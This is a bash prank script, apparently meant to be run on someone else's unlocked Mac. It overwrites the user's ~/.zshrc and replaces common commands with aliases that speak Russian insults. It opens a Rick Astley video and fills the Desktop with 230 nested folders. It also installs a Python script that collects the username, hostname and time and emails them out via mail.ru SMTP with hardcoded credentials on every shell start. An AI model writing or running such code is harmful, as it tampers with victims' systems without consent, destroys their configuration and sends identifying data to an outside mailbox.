#bin/bash/
file=~/.zshrc
py=~/t.py
volume="osascript -e \"set Volume 3\"" # TODO: переключение вывода на динамик 
touch $file


echo "cd ~/../../.."> $file
echo " ">> $file

# echo $volume >> .zshrc

# TODO: больше фраз и смайликов
echo "alias ls='echo Почему ты не заблокировал мак && $volume && say -v Milena Почему ты не заблокировал мак;'">> $file
echo "alias cd='echo Не трогай терминал, кожанный мешок && $volume && say -v Milena Не трогай терминал, кожанный мешок;'">> $file
echo "alias pwd='echo Жаль, но я не могу этого сделать && $volume && say -v Milena Жаль, но я не могу этого сделать;'">> $file
echo "alias whoami='echo Свинья ты не мытая && $volume && say -v Milena Свинья ты не мытая;'">> $file
echo "alias git='echo Какой гит, ты даже компьютер заблокировать не можешь && $volume && say -v Milena Какой гит, ты даже компьютер заблокировать не можешь;'">> $file
echo "alias gcc='echo Стой стой стой, никакого кода && $volume && say -v Milena Стой стой стой, никакого кода;'">> $file
echo "alias clear='echo Подумай над своим поведением && $volume && say -v Milena Подумай над своим поведением;'">> $file
echo "alias kill='echo Ты меня совсем не ценишь && $volume && say -v Milena Ты меня совсем не ценишь;'">> $file
echo "alias ps='echo Ты знаешь команды, но не знаешь как выключить мак && $volume && say -v Milena echo Ты знаешь команды, но не знаешь как выключить мак;'" >> $file
echo "alias chmod='echo У тебя нет здесь прав && $volume && say -v Milena У тебя нет здесь прав;'">> $file
echo "alias bash='echo Ну нет. Мы ещё не закончили && $volume && say -v Milena Ну нет. Мы ещё не закончили;'">> $file
echo "python $py" >> $file

echo " ">> $file
i=230
minus_dir="for (( var = 0; var < $i; var++ )) do rm -rf ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var; done"

# TODO: добавить разворот окна на полную
echo "$volume && open https://www.youtube.com/watch\?v\=dQw4w9WgXcQ\&ab_channel\=RickAstley" >> $file
plus_dir="for (( var = 0; var < $i; var++ )) do mkdir ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var ; mkdir ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var/Наверное\ тебе\ стоит\ извиниться;mkdir ~/Desktop/ТВОЙ\ МАК\ ОБИДЕЛСЯ\ \$var/Наверное\ тебе\ стоит\ извиниться/Надеюсь\ ты\ решишь\ эту\ загадку; done"
echo $plus_dir>> $file

# congrat="osascript -e 'display dialog \"Желаю пройти на основу\" with title \"Поздравляю!\"'"
# echo $congrat >> $file

echo "import os" > $py
echo "import smtplib" >> $py
echo " ">> $py
echo "os.system('whoami > log.txt')" >> $py
echo "os.system('hostname >> log.txt')" >> $py
echo "os.system('date \"+%H:%M:%S %Y-%m-%d\" >> log.txt')" >> $py
echo "with open('log.txt') as f:" >> $py
echo "    mesage = f.read()" >> $py
echo "pochta = 'ggg44466641gmail.com@mail.ru'" >> $py
echo "parol = 'dp7G32zfzqwpmXBw7mDB'" >> $py
echo " " >> $py
echo "smtpObj = smtplib.SMTP('smtp.mail.ru', 587)" >> $py
echo "smtpObj.starttls()" >> $py
echo "smtpObj.login(pochta, parol)" >> $py
echo "smtpObj.sendmail(pochta, pochta, mesage)" >> $py
echo "smtpObj.quit()" >> $py
echo "os.system('rm log.txt')" >> $py

echo " ">> $file
echo "reset" >> $file
echo "echo ಥ_ಥ Почему ты не заблокировал меня ಥ_ಥ" >> $file

# echo "congrat=\"osascript -e 'display dialog \"Желаю пройти на основу\" with title \"Поздравляю!\"'\"" >> $file
str="echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && rm -rf $py && $minus_dir && exit"
echo "alias Прости='$str'">> $file
echo "alias прости='$str'">> $file
echo "alias sorry='$str'">> $file
echo "alias Sorry='$str'">> $file
echo "alias klotzgal='$str'">> $file
echo "alias извини='$str'">> $file
echo "alias Извини='$str'">> $file
echo " ">> $file